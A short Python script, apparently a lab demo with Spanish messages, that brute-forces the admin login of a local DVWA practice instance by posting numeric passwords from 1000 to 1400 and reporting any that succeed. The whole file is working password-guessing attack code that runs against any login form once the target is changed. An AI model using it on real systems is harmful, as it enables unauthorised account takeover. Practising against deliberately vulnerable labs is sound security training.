import requests
from requests import Session
from time import sleep

TARGET = "http://localhost:4280/login.php"  
USERNAME = "admin"
START = 1000   
END = 1400     
DELAY = 0.2    

def is_login_successful(resp_text, resp):    
    if resp.status_code in (302, 303):
        return True
    markers = ["welcome to damn vulnerable web application", "logout", "logged in as", "welcome"]
    for m in markers:
        if m.lower() in resp_text.lower():
            return True
    if "login failed" in resp_text.lower():
        return False
    return False

def attempt_bruteforce():
    s = Session()
    try:
        r = s.get(TARGET, timeout=5)
    except Exception as e:
        print("ERROR: no se puede conectar a", TARGET)
        print("Detalle:", e)
        return

    print("Iniciando demo de brute-force contra", TARGET)
    for pwd in range(START, END + 1):
        data = {
            "username": USERNAME,
            "password": str(pwd),
            "Login": "Login"
        }
        try:
            resp = s.post(TARGET, data=data, timeout=5, allow_redirects=True)
        except Exception as e:
            print(f"Intento {pwd}: error de request ({e}) — deteniendo.")
            break

        success = is_login_successful(resp.text, resp)
        print(f"Intento {pwd}: {'SUCCESS' if success else 'failed'} (HTTP {resp.status_code})")
        if success:
            print("CREDENCIAL POSIBLE ->", USERNAME, str(pwd))
            break

        sleep(DELAY)

if __name__ == "__main__":
    attempt_bruteforce()
